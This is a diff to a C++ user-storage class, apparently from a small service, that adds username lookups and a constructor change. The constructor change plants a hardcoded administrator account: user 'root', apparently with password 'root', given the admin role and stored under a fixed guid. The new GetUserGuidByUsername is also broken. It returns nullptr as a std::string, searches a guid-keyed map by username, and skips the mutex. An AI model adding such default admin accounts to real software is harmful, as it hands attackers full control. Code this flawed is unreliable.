@@ -3,6 +3,12 @@
 
 Storage::Storage() {
     _storage = std::map<std::string, User>();
+
+    User rootUser = User("root", "root@root.ru", "root");
+    rootUser.ChangeRole(true); //Is root?
+
+    std::lock_guard<std::mutex> guard(_mtx);
+    _storage["rootrootrootrootroot"] = rootUser;
 }
 
 Storage::~Storage() {
@@ -39,11 +45,32 @@ std::map<std::string, User>* Storage::GetUsers() {
     return &_storage;
 }
 
-User* Storage::GetUserByGuid(std::string& guid) {
+User* Storage::GetUserByGuid(const std::string& guid) {
     std::lock_guard<std::mutex> guard(_mtx);
 
     if (_storage.count(guid) > 0) {
         return &_storage[guid];
+    }
+
+    return nullptr;
+}
+
+std::string Storage::GetUserGuidByUsername(const std::string &username)
+{
+    auto it = _storage.find(username);
+    if (it != _storage.end()) {
+        return (it->first);
+    }
+
+    return nullptr;
+}
+
+User* Storage::GetUserByUsername(const std::string& uName) {
+    std::lock_guard<std::mutex> guard(_mtx);
+
+    auto it = _storage.find(uName);
+    if (it != _storage.end()) {
+        return &(it->second);
     }
 
     return nullptr;
